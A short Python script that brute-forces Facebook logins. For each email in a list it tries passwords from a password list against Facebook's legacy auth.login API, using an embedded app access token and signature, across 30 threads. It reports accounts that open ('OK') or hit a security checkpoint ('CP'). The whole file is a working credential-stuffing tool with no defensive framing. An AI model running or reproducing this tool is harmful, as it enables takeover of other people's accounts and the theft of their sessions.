import requests,random
from concurrent.futures import ThreadPoolExecutor
import re

H = '\033[92;m'
M = '\033[93;m'
P = '\033[0;m'

def login(email, pasw):
    for ps in pasw:
        b = '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
        params = {
            'access_token':b,
            'format': 'JSON',
            'sdk_version': '2',
            'email': email,
            'locale': 'en_US',
            'password': ps,
            'sdk': 'ios',
            'generate_session_cookies': '1',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
        }

        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if 'session_key' in response.text or "EAAA" in response.text:
            print(f'\n{P}    -> {H}OK{P}: {email} --> {ps}')
            break
        elif 'www.facebook.com' in response.json()['error_msg']:
            print(f'\n{P}    -> {M}CP{P}: {email} --> {ps}')
            break

def start(list_id, list_pass):
    global count
    with ThreadPoolExecutor(max_workers=30) as th:
        for x in list_id:
            th.submit(login, (x.replace('\n', '')), (list_pass))
    print('    -> Selesai')
